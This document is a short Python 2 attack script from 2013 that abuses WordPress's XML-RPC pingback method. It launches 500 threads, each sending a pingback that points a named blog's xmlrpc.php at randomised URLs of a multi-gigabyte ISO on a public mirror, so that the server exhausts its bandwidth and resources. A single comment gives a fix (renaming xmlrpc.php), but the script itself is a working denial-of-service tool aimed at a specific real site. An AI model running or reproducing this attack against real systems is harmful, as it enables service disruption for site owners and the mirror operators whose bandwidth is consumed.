#!/usr/bin/env python
#-*- coding:utf-8 -*-

# FileName: attack_wordpress_xmlrpc.php
# Date: Fri 24 May 2013 01:08:30 AM CST
# Author: Dong Guo

# How To Fix This Bug: 
# sudo mv xmlrpc.php xmlrpc.php.bak

from xmlrpclib import ServerProxy
from urllib import urlopen
from random import randint
from threading import Thread

# Define target
targetURL = "http://heylinux.com/archives/2542.html"
hugeFile = "http://mirror.sohu.com/centos/6.4/isos/x86_64/CentOS-6.4-x86_64-bin-DVD1.iso#i%d"

# Fetch Pingback-URL 
#pingbackURL = urlopen(targetURL).headers["X-Pingback"]
pingbackURL = 'http://heylinux.com/xmlrpc.php'
print "Target URL: %s\nPingback:  %s" % (targetURL, pingbackURL)

# Attack 
def attack():
    server = ServerProxy(pingbackURL)
    try: server.pingback.ping(hugeFile % randint(10,10000000000000), targetURL)
    except: pass
for i in range(500):
    Thread(target=attack).start()
print "-- attacking --"
